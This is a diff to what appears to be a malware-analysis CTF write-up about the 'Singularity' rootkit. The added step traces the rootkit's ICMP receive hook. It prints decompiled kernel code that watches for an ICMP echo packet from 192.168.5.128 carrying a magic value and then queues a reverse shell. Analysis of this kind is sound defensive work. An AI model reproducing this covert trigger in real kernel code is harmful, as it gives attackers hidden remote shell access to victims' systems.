@@ -445,6 +445,64 @@ int __cdecl hiding_icmp_init()
 
 ![Question 11 Disassembly View](Artifacts/Malops-CTF-Singularity-Qs11-Identify-ICMP-Hooks-Disassembly-View.png)
 
+**Step 2** — Trace hook_icmp_rcv()
+
+**Disassembly View:**
+
+![Question 11 Disassembly View](Artifacts/Malops-CTF-Singularity-Qs11-Identify-ICMP-RCV-Hook-Disassembly-View.png
+)
+
+The hook checks incoming ICMP packets for a specific source IP and ICMP characteristics. When the expected packet is received, it schedules spawn_revshell() for execution.
+
+```text
+int __fastcall hook_icmp_rcv(sk_buff *skb)
+{
+  unsigned __int8 *head; // rdx
+  __int64 network_header; // rax
+  bool v4; // zf
+  unsigned __int8 *v5; // rax
+  unsigned __int8 *v6; // rbp
+  unsigned __int8 *v8; // r12
+  _QWORD *v9; // rax
+  __int64 v10; // rsi
+  u32 trigger_ip; // [rsp+4h] [rbp-24h] BYREF
+  unsigned __int64 v12; // [rsp+8h] [rbp-20h]
+
+  v12 = __readgsqword(0x28u);
+  trigger_ip = 0;
+  if ( skb != nullptr )
+  {
+    head = skb->head;
+    network_header = skb->network_header;
+    v4 = &head[network_header] == nullptr;
+    v5 = &head[network_header];
+    v6 = v5;
+    if ( !v4 && v5[9] == 1 )
+    {
+      v8 = &head[skb->transport_header];
+      if ( v8 != nullptr
+        && (unsigned int)in4_pton(a1: "192.168.5.128", a2: 0xFFFFFFFFLL, a3: &trigger_ip, a4: 0xFFFFFFFFLL, a5: 0) != 0
+        && *((_DWORD *)v6 + 3) == trigger_ip
+        && *v8 == 8
+        && *((_WORD *)v8 + 3) == 0xCF07 )
+      {
+        v9 = (_QWORD *)_kmalloc_cache_noprof(a1: kmalloc_caches[5], a2: 2080, a3: 32);
+        if ( v9 != nullptr )
+        {
+          v9[3] = spawn_revshell;
+          v10 = system_wq;
+          *v9 = 0xFFFFFFFE00000LL;
+          v9[1] = v9 + 1;
+          v9[2] = v9 + 1;
+          queue_work_on(a1: 0x2000, a2: v10);
+        }
+      }
+    }
+  }
+  return orig_icmp_rcv(a1: skb);
+}
+```
+
 
 
 
